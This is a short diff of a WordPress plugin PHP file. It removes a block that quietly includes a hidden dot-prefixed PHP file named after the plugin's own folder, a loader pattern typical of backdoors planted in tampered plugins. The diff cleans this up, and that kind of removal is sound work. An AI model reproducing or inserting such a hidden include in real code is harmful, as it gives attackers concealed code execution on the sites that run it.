@@ -12,11 +12,7 @@
  * @since ----
  * @param array $atts represts module attribuits.
  * @access public
- */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
+ */
 function woocomposer_single_style01( $atts ) {
 
 		$ult_design_single01 = shortcode_atts(
